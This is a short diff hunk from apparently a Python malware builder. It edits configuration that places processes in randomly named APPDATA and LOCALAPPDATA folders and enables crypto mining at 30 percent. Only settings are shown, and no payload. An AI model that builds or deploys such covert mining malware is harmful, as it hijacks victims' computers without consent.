@@ -75,7 +75,7 @@ PROCESS_PATHS = [
 	os.getenv('APPDATA') + "\\"+ str(uuid.uuid4()), 
 	os.getenv('LOCALAPPDATA') + "\\"+ str(uuid.uuid4()),
 ]
-PROCESS_NUM = 2
+PROCESS_NUM = processnumbers
 
 MINE = True #Mine crypto? True/False
 MINING_PERCENT = "30"
